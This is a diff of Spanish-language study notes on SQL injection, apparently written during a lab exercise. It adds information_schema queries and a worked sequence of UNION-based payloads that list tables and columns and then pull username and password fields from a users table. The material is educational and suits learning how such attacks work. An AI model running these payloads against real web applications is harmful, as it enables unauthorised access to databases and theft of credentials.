@@ -79,12 +79,33 @@ Verificar el tipo de datos que maneja cada columna debe de ser del mismo tipo pa
 (falta investigar los datos de la base como nombre de tabla etc) 
 #### Enumerar datos de la base de datos
 
+***La mayoría de los tipos de bases de datos con la notable excepción de Oracle***
+
 La mayoría de los tipos de bases de datos (con la notable excepción de Oracle) tienen un conjunto de vistas llamado "information_schema" que proporciona información sobre la base de datos. Por ejemplo las ***tablas***
 
 ```
 SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
 
 ```
+***Ejemplo***
+
+```
+'union select TABLE_NAME,null  FROM information_schema.tables--
+
+
+'union select COLUMN_NAME,null  FROM information_schema.columns WHERE table_name = 'users_feqfcm'--
+
+username_smvbda
+
+password_dabqhh
+
+'union select username_smvbda,password_dabqhh  FROM users_feqfcm--
+```
+
+
+
+***Para Oracle***
 
 
 
